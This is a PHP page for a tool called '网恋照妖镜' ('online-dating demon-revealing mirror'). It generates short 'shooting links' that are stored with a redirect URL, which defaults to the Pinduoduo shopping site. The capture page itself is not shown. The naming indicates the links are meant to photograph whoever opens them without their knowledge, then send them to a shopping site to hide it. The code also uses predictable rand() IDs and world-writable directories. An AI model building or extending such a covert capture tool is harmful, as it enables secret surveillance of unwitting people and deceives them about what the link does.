<?php
// 配置信息
$json_file = 'links.json';
$images_dir = 'images/';

// 创建必要的目录
if (!file_exists($images_dir)) {
    mkdir($images_dir, 0777, true);
}

// 创建必要的JSON文件
if (!file_exists($json_file)) {
    file_put_contents($json_file, json_encode(array()));
}

// 生成随机6位字符串（字母大小写+数字）
function generateRandomString($length = 6) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$message = '';
$generated_url = '';
$query_id = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $redirect_url = $_POST['redirect_url'];
    
    // 验证URL
    if (filter_var($redirect_url, FILTER_VALIDATE_URL)) {
        // 生成查询ID
        $query_id = generateRandomString();
        
        // 读取现有链接数据
        $links = json_decode(file_get_contents($json_file), true);
        
        // 保存新链接
        $links[$query_id] = $redirect_url;
        file_put_contents($json_file, json_encode($links, JSON_PRETTY_PRINT));
        
        // 设置Cookie，有效期7天
        setcookie('query_id', $query_id, time() + (7 * 24 * 60 * 60), '/');
        
        // 生成拍摄链接
        $generated_url = 'https://' . $_SERVER['HTTP_HOST'] . '/' . $query_id;
        
        $message = '链接生成成功，点击链接自动复制！';
    } else {
        $message = '请输入有效的URL地址！';
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>网恋照妖镜 - 链接生成</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            color: #333;
        }
        form {
            margin-top: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input[type="url"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .message {
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .generated-url {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
        }
        .generated-url label {
            font-weight: bold;
        }
        .generated-url input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #e9ecef;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>网恋照妖镜</h1>
        <h2>链接生成</h2>
        
        <?php if ($message): ?>
            <div class="message <?php echo strpos($message, '成功') !== false ? 'success' : 'error'; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>
        
        <form method="POST" action="">
            <label for="redirect_url">拍摄成功后跳转的网址（默认跳转到拼多多）：</label>
            <input type="url" id="redirect_url" name="redirect_url" required value="https://mobile.yangkeduo.com/">
            <input type="submit" value="生成拍摄链接">
        </form>
        
        <?php if ($generated_url): ?>
            <div class="generated-url">
                <label>拍摄链接：</label>
                <input type="text" id="generatedUrl" value="<?php echo $generated_url; ?>" readonly onclick="copyToClipboard(this)">
                <p id="copyMessage" style="margin-top: 5px; color: #28a745; font-size: 14px; display: none;">
                    链接已复制到剪贴板！
                </p>
                <p style="margin-top: 10px; color: #666; font-size: 14px;">
                    查询ID：<?php echo $query_id; ?>
                </p>
            </div>
        <?php endif; ?>
        
        <div style="margin-top: 20px; text-align: center;">
            <a href="my_generations.php" style="color: #007bff; text-decoration: none;">查看我的生成记录</a>
        </div>
    </div>
    
    <script>
        function copyToClipboard(element) {
            // 选择文本
            element.select();
            element.setSelectionRange(0, 99999); // 兼容移动端
            
            // 复制到剪贴板
            document.execCommand('copy');
            
            // 显示复制成功消息
            const copyMessage = document.getElementById('copyMessage');
            copyMessage.style.display = 'block';
            
            // 3秒后隐藏消息
            setTimeout(() => {
                copyMessage.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>